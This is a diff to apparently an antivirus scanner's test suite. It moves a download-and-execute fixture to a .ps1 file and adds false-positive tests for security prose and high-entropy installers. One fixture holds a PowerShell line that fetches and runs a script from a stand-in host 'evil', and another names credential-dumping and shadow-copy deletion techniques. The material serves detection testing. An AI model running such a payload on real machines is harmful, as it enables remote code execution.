@@ -144,14 +144,32 @@ def test_ioc_engine_flags_attacks_but_not_benign():
 
 
 def test_script_with_ioc_is_flagged_not_clean():
-    # A plain-looking .txt that actually carries a download-and-execute payload.
+    # A SCRIPT that carries a download-and-execute payload (high-severity IOC).
+    # NB: IOC scanning is intentionally restricted to script types now — scanning prose
+    # (.txt/.md) for indicator strings flagged docs + the scanner's own signature DB.
     body = ('echo hello\n'
             'IEX (New-Object Net.WebClient).DownloadString("http://evil/x.ps1")\n')
-    p = _write("readme.txt", body)
+    p = _write("payload.ps1", body)
     r = antivirus.scan_file(str(p), deep=False)
     assert r["verdict"] in ("suspicious", "malicious"), r
     assert any("indicator" in x for x in r["reasons"]), r
     assert "ioc-signatures" in r["engines"], r
+
+
+def test_prose_with_ioc_words_not_flagged():
+    # A .txt/.md that merely MENTIONS techniques must NOT be flagged (false-positive guard).
+    body = "Notes on mimikatz, vssadmin delete shadows, and reverse shells via /dev/tcp."
+    p = _write("security_notes.md", body)
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] == "clean", r
+
+
+def test_compressed_container_not_flagged_on_entropy():
+    # A high-entropy .dmg (every installer) must NOT be 'suspicious' just for entropy.
+    import os
+    p = _write("Installer.dmg", os.urandom(200_000))
+    r = antivirus.scan_file(str(p), deep=False)
+    assert r["verdict"] == "clean", r
 
 
 def test_signature_db_hash_is_malicious():
